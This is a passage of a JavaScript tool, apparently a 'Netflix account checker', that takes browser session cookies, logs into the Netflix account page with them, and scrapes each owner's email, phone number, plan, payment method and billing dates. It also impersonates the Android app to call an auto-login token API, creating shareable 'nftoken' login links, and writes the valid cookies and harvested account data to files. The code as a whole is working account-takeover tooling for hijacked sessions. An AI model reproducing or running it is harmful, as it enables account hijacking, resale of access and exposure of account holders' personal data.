      hasSecureNetflixId: cookieMap.has('SecureNetflixId'),
    };
  }

  buildTokenContext(account) {
    if (!account || typeof account !== 'object') {
      return { buildId: null, authURL: null, userGuid: null };
    }

    return {
      buildId: this.normalizeTokenContextValue(account.buildId),
      authURL: this.normalizeTokenContextValue(account.authURL),
      userGuid: this.normalizeTokenContextValue(account.userGuid),
    };
  }

  async requestNFToken(cookieString) {
    try {
      const payload = {
        operationName: 'CreateAutoLoginToken',
        variables: { scope: 'WEBVIEW_MOBILE_STREAMING' },
        extensions: {
          persistedQuery: {
            version: 102,
            id: '76e97129-f4b5-41a0-a73c-12e674896849',
          },
        },
      };

      const headers = {
        'User-Agent':
          'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
        Accept:
          'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
        'Content-Type': 'application/json',
        Origin: 'https://www.netflix.com',
        Referer: 'https://www.netflix.com/',
        Cookie: cookieString,
      };

      const response = await axios.post(NFTOKEN_API_URL, payload, {
        headers,
        timeout: TOKEN_TIMEOUT_MS,
        validateStatus: () => true,
        proxy: false,
      });

      if (response.status !== 200) {
        return {
          success: false,
          token: null,
          link: null,
          stage: 'request',
          error: `Token API HTTP ${response.status}`,
        };
      }

      const data = response.data;
      if (data?.data?.createAutoLoginToken) {
        const token =
          typeof data.data.createAutoLoginToken === 'string'
            ? data.data.createAutoLoginToken.trim()
            : '';
        if (!token) {
          return {
            success: false,
            token: null,
            link: null,
            stage: 'graphql',
            error: 'Token API returned an empty token',
          };
        }
        return {
          success: true,
          token,
          link: `https://netflix.com/?nftoken=${token}`,
          stage: 'complete',
        };
      }

      if (data?.errors) {
        return {
          success: false,
          token: null,
          link: null,
          stage: 'graphql',
          error: JSON.stringify(data.errors),
        };
      }

      return {
        success: false,
        token: null,
        link: null,
        stage: 'graphql',
        error: `Unexpected response: ${JSON.stringify(data)}`,
      };
    } catch (err) {
      return {
        success: false,
        token: null,
        link: null,
        stage: 'request',
        error: err.message || 'Unknown error',
      };
    }
  }

  async getNFToken(cookieString, account = null) {
    try {
      let preparedCookieHeader = cookieString;
      const cookieMap = this.toCookieMap(preparedCookieHeader);
      const accountContext = this.buildTokenContext(account);
      const profileGuidFromCookie = this.extractProfileGuid(cookieMap);
      const bootstrapResult = await this.bootstrapTokenContext(preparedCookieHeader);
      const context = {
        buildId:
          this.normalizeTokenContextValue(bootstrapResult.buildId) ||
          accountContext.buildId,
        authURL:
          this.normalizeTokenContextValue(bootstrapResult.authURL) ||
          accountContext.authURL,
        userGuid:
          this.normalizeTokenContextValue(bootstrapResult.userGuid) ||
          accountContext.userGuid,
      };
      const profileGuid = this.normalizeTokenContextValue(profileGuidFromCookie) || context.userGuid;
      preparedCookieHeader = bootstrapResult.cookieHeader || preparedCookieHeader;

      if (!profileGuid || !context.authURL) {
        const missingFields = [];
        if (!profileGuid) missingFields.push('profile GUID');
        if (!context.authURL) missingFields.push('authURL');
        return {
          success: false,
          token: null,
          link: null,
          stage: 'prepare',
          error: `Missing ${missingFields.join(' and ')} for token generation`,
        };
      }

      const switchResult = await this.switchProfileForToken({
        cookieHeader: preparedCookieHeader,
        profileGuid,
        authURL: context.authURL,
        buildId: context.buildId,
        userGuid: context.userGuid,
      });
      preparedCookieHeader = switchResult.cookieHeader || preparedCookieHeader;

      return await this.requestNFToken(preparedCookieHeader);
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      return {
        success: false,
        token: null,
        link: null,
        stage: 'prepare',
        error: message || 'Enhanced token flow failed',
      };
    }
  }

  toPublicResult(account) {
    const clean = (value) => (value === undefined ? null : value);
    const maxStreams =
      account.maxStreams == null ? null : String(account.maxStreams);
    const plan = this.toEnglishPlanName(account.plan, maxStreams);
    const country = this.normalizeCountryName(account.countryOfSignup);
    const membershipStatus = this.toEnglishMembershipStatus(account.membershipStatus);

    return {
      valid: true,
      membershipStatus: clean(membershipStatus),
      countryOfSignup: clean(country),
      plan: clean(plan),
      price: clean(this.formatPriceWithSymbol(account.price, account.currency)),
      memberSince: clean(this.decodeEscapedText(account.memberSince)),
      phone: this.normalizePhone(account.phone),
      phoneVerified: Boolean(account.phoneVerified),
      email: clean(this.decodeEscapedText(account.email)),
      emailVerified: Boolean(account.emailVerified),
      nextBillingRaw: clean(account.nextBillingRaw),
      nextBilling: clean(account.nextBilling),
      membershipEndRaw: clean(account.membershipEndRaw),
      membershipEndDate: clean(account.membershipEndDate),
      daysUntilExpiration: clean(account.daysUntilExpiration),
      isActive: Boolean(account.isActive),
      isPremium: Boolean(account.isPremium),
      nftoken: clean(account.nftoken),
      nftokenLink: clean(account.nftokenLink),
      nftokenStage: clean(account.nftokenStage),
      nftokenError: clean(account.nftokenError),
    };
  }

  extractAccountData(html) {
    const account = {};

    account.membershipStatus =
      this.extractJsonField(html, 'membershipStatus') || null;
    account.countryOfSignup =
      this.extractJsonField(html, 'countryOfSignup') || null;
    account.currentRegion =
      this.extractJsonField(html, 'currentRegion') || null;

    account.plan =
      this.extractByRegex(
        html,
        /localizedPlanName":\{"fieldType":"String","value":"([^"]+)"/
      ) || null;
    account.planId = this.extractJsonField(html, 'planId') || null;

    account.price =
      this.extractByRegex(
        html,
        /planPrice":\{"fieldType":"String","value":"([^"]+)"/
      ) || null;
    account.currency = this.extractJsonField(html, 'currencyCode') || null;
    account.price = this.formatPriceWithSymbol(account.price, account.currency) || null;

    const rawMemberSince =
      this.extractJsonField(html, 'memberSince') || null;
    account.memberSince = this.decodeEscapedText(rawMemberSince, true) || null;

    account.paymentMethod =
      this.extractByRegex(
        html,
        /paymentType":\{"fieldType":"String","value":"([^"]+)"/
      ) || null;
    account.paymentHold =
      html.includes('"onHold":true') ||
      html.toLowerCase().includes('payment hold');

    account.phone = this.normalizePhone(this.extractJsonField(html, 'phoneNumber'));
    account.phoneVerified = html.includes('"phoneNumberVerified":true');

    account.email = this.extractJsonField(html, 'email') || null;
    account.emailVerified = html.includes('"emailVerified":true');

    account.videoQuality =
      this.extractByRegex(
        html,
        /videoQualityDetail":\{"fieldType":"String","value":"([^"]+)"/
      ) || null;
    account.maxStreams =
      this.extractByRegex(
        html,
        /maxStreams":\{"fieldType":"Numeric","value":([^,}]+)/
      ) || null;

    account.extraMember =
      html.includes('"isExtraMember":true') || html.includes('Extra Member');

    account.userGuid = this.extractJsonField(html, 'userGuid') || null;
    account.esn = this.extractJsonField(html, 'esn') || null;
    account.authURL = this.extractJsonField(html, 'authURL') || null;
    account.buildId = this.extractJsonField(html, 'BUILD_IDENTIFIER') || null;

    let nextBilling = this.extractByRegex(
      html,
      /Next payment:\s*(\d{1,2}\s+\w+\s+\d{4})/i
    );
    if (!nextBilling) {
      const ts = this.extractByRegex(
        html,
        /"nextBillingDate":\{"fieldType":"Date","value":(\d+)\}/
      );
      if (ts) nextBilling = Number(ts);
    }

    let membershipEnd = this.extractByRegex(
      html,
      /Membership will end on:\s*(\d{1,2}\s+\w+\s+\d{4})/i
    );
    if (!membershipEnd) {
      membershipEnd = this.extractByRegex(
        html,
        /Your membership ends on:\s*(\d{1,2}\s+\w+\s+\d{4})/i
      );
    }

    this.assignParsedDateFields(account, 'nextBillingRaw', 'nextBilling', nextBilling);
    this.assignParsedDateFields(
      account,
      'membershipEndRaw',
      'membershipEndDate',
      membershipEnd
    );

    const reactContextAccount = this.extractFromReactContext(html);
    if (reactContextAccount && typeof reactContextAccount === 'object') {
      for (const [key, value] of Object.entries(reactContextAccount)) {
        if (value === undefined || value === null) {
          continue;
        }

        if (typeof value === 'string' && value.trim() === '') {
          continue;
        }

        account[key] = value;
      }
    }

    if (!account.memberSinceIso && account.memberSince) {
      account.memberSinceIso = account.memberSince;
    }

    account.countryOfSignup = this.normalizeCountryName(account.countryOfSignup);
    account.currentRegion = this.normalizeCountryName(account.currentRegion);
    account.price = this.formatPriceWithSymbol(account.price, account.currency) || account.price;
    account.isUserOnHold =
      typeof account.isUserOnHold === 'boolean' ? account.isUserOnHold : account.paymentHold;

    const expirationSource =
      account.membershipEndRaw || account.nextBillingRaw || null;
    account.daysUntilExpiration = expirationSource
      ? this.calcDaysDiff(expirationSource)
      : null;

    const normalizedMembershipStatus = this.toEnglishMembershipStatus(account.membershipStatus);
    account.isActive = normalizedMembershipStatus === 'Current Member';
    const normalizedPlan = this.toEnglishPlanName(account.plan, account.maxStreams);
    account.isPremium = normalizedPlan
      ? normalizedPlan.toLowerCase().includes('premium')
      : false;

    account.summary = [
      `Plan: ${account.plan || 'Unknown'} | Country: ${
        account.countryOfSignup || 'Unknown'
      } | Price: ${account.price || 'Unknown'}`,
      `Email: ${account.email || 'Unknown'}`,
    ].join('\n');
    account.summary = this.decodeEscapedText(account.summary) || null;

    account.directWatchLink = null;

    return account;
  }

  async checkCookie(cookieString, options = {}) {
    try {
      let res = await this.fetchAccountHtml(cookieString);
      let finalUrl = this.getFinalResponseUrl(res);

      if (res.status !== 200) return { valid: false, reason: `HTTP ${res.status}` };

      let html = res.data;
      let account = this.extractAccountData(html);
      let isLoggedIn = this.isLoggedIn(html, finalUrl);
      let hasSignals = this.hasRealAccountSignals(account);

      if (!isLoggedIn && !hasSignals) {
        const targetUrl = finalUrl || 'unknown-url';
        return { valid: false, reason: `Not logged in (${targetUrl})` };
      }

      const membershipStatus = String(account.membershipStatus || '').trim().toUpperCase();
      if (membershipStatus === 'ANONYMOUS') {
        return { valid: false, reason: 'Anonymous membership (logged out)' };
      }

      if (!hasSignals) return { valid: false, reason: 'No real account signals found' };

      const disqualificationReasons = this.getDisqualificationReasons(account);
      if (disqualificationReasons.length > 0) {
        return { valid: false, reason: disqualificationReasons.join(' + ') };
      }
      const skipNFToken = Boolean(options && options.skipNFToken);
      if (skipNFToken) {
        account.nftoken = null;
        account.nftokenLink = null;
        account.nftokenStage = 'skipped';
        account.nftokenError = 'Skipped by user option';
      } else {
        const nftokenResult = await this.getNFToken(cookieString, account);
        account.nftoken = nftokenResult.token;
        account.nftokenLink = nftokenResult.link;
        account.nftokenStage = nftokenResult.success ? null : nftokenResult.stage || null;
        account.nftokenError = nftokenResult.success
          ? null
          : nftokenResult.error || 'NFTOKEN generation failed';
        if (!nftokenResult.success) {
          const stageLabel = nftokenResult.stage ? `[${nftokenResult.stage}] ` : '';
          console.warn(`[nftoken] ${stageLabel}Failed to get token: ${nftokenResult.error}`);
        }
      }

      return this.toPublicResult(account);
    } catch (err) {
      return { valid: false, reason: err.message || 'Unknown error' };
    }
  }

  printAccountToConsole(result, idx, total) {
    console.log(`${'-'.repeat(80)}`);
    console.log(`[${idx + 1}/${total}]`);
    console.log(`${'-'.repeat(80)}`);
    console.log(JSON.stringify(result, null, 2));
    console.log('');
  }

  async checkMultipleCookies(cookieStrings) {
    console.log(`\n${'='.repeat(80)}`);
    console.log(`NETFLIX ACCOUNT CHECKER - /account (FULL)`);
    console.log(`${'='.repeat(80)}`);
    console.log(`Checking ${cookieStrings.length} cookie(s)...\n`);

    for (let i = 0; i < cookieStrings.length; i++) {
      const cookie = cookieStrings[i];
      const result = await this.checkCookie(cookie);
      this.printAccountToConsole(result, i, cookieStrings.length);
      if (result.valid) {
        this.results.valid.push(result);
        this.validCookies.push(cookie);
      } else {
        this.results.invalid.push(result);
      }
    }

    this.printSummary();
  }

  printSummary() {
    console.log(`${'='.repeat(80)}`);
    console.log(`FINAL SUMMARY`);
    console.log(`${'='.repeat(80)}`);
    console.log(`Valid: ${this.results.valid.length}`);
    console.log(`Invalid: ${this.results.invalid.length}`);
    const total = this.results.valid.length + this.results.invalid.length;
    if (total > 0) {
      const rate = ((this.results.valid.length / total) * 100).toFixed(2);
      console.log(`Success Rate: ${rate}%`);
    }
    console.log(`${'='.repeat(80)}\n`);

    if (this.results.valid.length > 0) {
      fs.writeFileSync('valid_cookies.txt', this.validCookies.join('\n\n'));
      fs.writeFileSync('netflix_accounts.json', JSON.stringify(this.results.valid, null, 2));
      console.log('Saved valid cookies to valid_cookies.txt');
      console.log('Saved full data to netflix_accounts.json');
    }
  }
}

if (require.main === module) {
  const fileArg = process.argv[2];
  if (!fileArg) {
    console.error('Usage: node netflix_checker.js <netscape_cookie_file>');
    process.exit(1);
  }
  const filePath = path.resolve(fileArg);
  const checker = new NetflixAccountChecker();
  const cookieHeader = checker.parseCookieFile(filePath);
  checker.checkMultipleCookies([cookieHeader]);
}

module.exports = NetflixAccountChecker;
